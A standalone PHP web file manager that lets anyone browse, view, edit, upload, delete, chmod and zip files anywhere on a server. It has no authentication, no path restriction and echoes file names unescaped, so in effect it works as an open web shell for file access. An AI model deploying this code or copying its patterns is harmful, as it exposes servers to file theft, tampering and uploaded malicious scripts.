<?php

// Function to recursively list directories and files
function listDirectory($dir) {
    // Get the current directory contents
    $files = scandir($dir);

    // Display current directory name
    echo "<h2>Directory: $dir</h2>";

    // Display link to go back to the parent directory
    $parentDir = dirname($dir);
    if ($dir !== '/') {
        echo "<a class='btn' href='?dir=" . urlencode($parentDir) . "'>Go Back</a><br>";
    }

    // Display option to create a new file
    echo "<form method='post'>
            <input type='text' name='new_file_name' placeholder='Enter new file name' required>
            <input class='btn' type='submit' name='create_file' value='Create File'>
        </form><br>";

    // Display upload form
    echo "<form method='post' enctype='multipart/form-data'>
            <input type='file' name='file_to_upload' required>
            <input class='btn' type='submit' name='upload_file' value='Upload File'>
        </form><br>";

    // Display form for setting file permissions
    echo "<form method='post'>
            <input type='text' name='permissions' placeholder='Set file permissions (e.g., 0755)' required>
            <input class='btn' type='submit' name='set_permission' value='Set Permissions'>
        </form><br>";

    // Display form to compress a folder
    echo "<form method='post'>
            <input type='submit' class='btn' name='compress_folder' value='Download Compressed Folder'>
        </form><br>";

    // Display list of directories and files
    echo "<ul class='file-list'>";
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $fullPath = "$dir/$file";
            if (is_dir($fullPath)) {
                echo "<li class='directory'>[DIR] <a href='?dir=" . urlencode($fullPath) . "'>$file</a></li>";
            } else {
                echo "<li class='file'>
                    [FILE] $file 
                    <a class='btn' href='?view=" . urlencode($fullPath) . "'>View</a> 
                    <a class='btn' href='?edit=" . urlencode($fullPath) . "'>Edit</a>
                    <a class='btn' href='?download=" . urlencode($fullPath) . "'>Download</a>
                    <a class='btn delete-btn' href='?delete=" . urlencode($fullPath) . "' onclick=\"return confirm('Are you sure you want to delete this file?');\">Delete</a>
                </li>";
            }
        }
    }
    echo "</ul>";
}

// Function to create a new file
function createFile($dir, $fileName) {
    $filePath = "$dir/$fileName";
    if (!file_exists($filePath)) {
        file_put_contents($filePath, ""); // Create an empty file
        echo "<p class='success'>File '$fileName' created successfully!</p>";
    } else {
        echo "<p class='error'>File '$fileName' already exists.</p>";
    }
}

// Function to upload a file
function uploadFile($dir) {
    if (isset($_FILES['file_to_upload']) && $_FILES['file_to_upload']['error'] == 0) {
        $uploadFilePath = $dir . '/' . basename($_FILES['file_to_upload']['name']);
        if (move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $uploadFilePath)) {
            echo "<p class='success'>File '" . basename($_FILES['file_to_upload']['name']) . "' uploaded successfully!</p>";
        } else {
            echo "<p class='error'>Failed to upload file.</p>";
        }
    } else {
        echo "<p class='error'>No file selected or there was an error during the upload.</p>";
    }
}

// Function to set file permissions
function setPermissions($filePath, $permissions) {
    if (chmod($filePath, octdec($permissions))) {
        echo "<p class='success'>Permissions set successfully for $filePath.</p>";
    } else {
        echo "<p class='error'>Failed to set permissions.</p>";
    }
}

// Function to view file content
function viewFile($filePath) {
    if (file_exists($filePath) && is_file($filePath)) {
        $content = htmlspecialchars(file_get_contents($filePath));
        echo "<h2>Viewing File: $filePath</h2>";
        echo "<pre class='file-content'>$content</pre>";
        echo "<a class='btn' href='?dir=" . urlencode(dirname($filePath)) . "'>Back to Directory</a>";
    } else {
        echo "<p class='error'>File not found.</p>";
    }
}

// Function to edit file content
function editFile($filePath) {
    if (isset($_POST['content'])) {
        file_put_contents($filePath, $_POST['content']);
        echo "<p class='success'>File saved successfully!</p>";
    }

    $content = htmlspecialchars(file_get_contents($filePath));
    echo "<h2>Editing File: $filePath</h2>";
    echo "<form method='post'>
            <textarea name='content' class='file-edit'>$content</textarea><br>
            <input class='btn' type='submit' value='Save Changes'>
        </form>";
    echo "<a class='btn' href='?dir=" . urlencode(dirname($filePath)) . "'>Back to Directory</a>";
}

// Function to delete a file
function deleteFile($filePath) {
    if (file_exists($filePath) && is_file($filePath)) {
        if (unlink($filePath)) {
            echo "<p class='success'>File '" . basename($filePath) . "' deleted successfully.</p>";
        } else {
            echo "<p class='error'>Failed to delete file.</p>";
        }
    } else {
        echo "<p class='error'>File not found.</p>";
    }
}

// Function to handle file downloads
function downloadFile($filePath) {
    if (file_exists($filePath) && is_file($filePath)) {
        // Set headers to force download
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    } else {
        echo "<p class='error'>File not found.</p>";
    }
}

// Function to compress folder and download as a zip
function compressFolder($folderPath) {
    $zipFileName = tempnam(sys_get_temp_dir(), 'zip') . ".zip";
    $zip = new ZipArchive;
    if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {
        $folderPath = realpath($folderPath);
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folderPath));
        foreach ($iterator as $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($folderPath) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }
        $zip->close();

        // Serve the zip file for download
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="compressed_folder.zip"');
        header('Content-Length: ' . filesize($zipFileName));
        readfile($zipFileName);
        unlink($zipFileName); // Delete temporary zip file
        exit;
    } else {
        echo "<p class='error'>Failed to create zip file.</p>";
    }
}

// Determine what action to take
if (isset($_GET['view'])) {
    $filePath = realpath($_GET['view']);
    viewFile($filePath);
} elseif (isset($_GET['edit'])) {
    $filePath = realpath($_GET['edit']);
    editFile($filePath);
} elseif (isset($_GET['download'])) {
    $filePath = realpath($_GET['download']);
    downloadFile($filePath); // Call the download function
} elseif (isset($_GET['delete'])) {
    $filePath = realpath($_GET['delete']);
    deleteFile($filePath); // Call the delete function
} elseif (isset($_POST['create_file']) && !empty($_POST['new_file_name'])) {
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
    $currentDir = realpath($currentDir);
    createFile($currentDir, $_POST['new_file_name']);
    listDirectory($currentDir);
} elseif (isset($_POST['upload_file'])) {
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
    $currentDir = realpath($currentDir);
    uploadFile($currentDir);
    listDirectory($currentDir);
} elseif (isset($_POST['set_permission']) && !empty($_POST['permissions'])) {
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
    $currentDir = realpath($currentDir);
    setPermissions($currentDir, $_POST['permissions']);
    listDirectory($currentDir);
} elseif (isset($_POST['compress_folder'])) {
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
    $currentDir = realpath($currentDir);
    compressFolder($currentDir); // Call the compress folder function
} else {
    // Default action: list directory contents
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
    $currentDir = realpath($currentDir);
    listDirectory($currentDir);
}

?>




<style>
body {
    font-family: Arial, sans-serif;
    margin: 20px;
    background-color: #f0f2f5;
}

h2 {
    font-size: 1.5rem;
    color: #333;
}

form {
    margin-bottom: 10px;
}

input[type="text"], input[type="file"], textarea {
    padding: 5px;
    font-size: 1rem;
    border: 1px solid #ccc;
    border-radius: 4px;
    width: 250px;
    margin-bottom: 10px;
}

textarea {
    width: 100%;
    height: 200px;
}

.btn {
    padding: 5px 10px;
    background-color: #007bff;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    text-decoration: none;
    display: inline-block;
    margin-right: 5px;
}

.btn:hover {
    background-color: #0056b3;
}

ul.file-list {
    list-style-type: none;
    padding: 0;
}

ul.file-list li {
    margin: 5px 0;
}

ul.file-list li.directory a {
    color: #007bff;
    font-weight: bold;
    text-decoration: none;
}

ul.file-list li.file a {
    color: #007bff;
    text-decoration: none;
}

ul.file-list li a.btn {
    font-size: 0.8rem;
    padding: 3px 7px;
}

pre.file-content {
    background-color: #f8f9fa;
    border: 1px solid #ccc;
    padding: 10px;
    overflow-x: auto;
}

.success {
    color: green;
}

.error {
    color: red;
}
</style>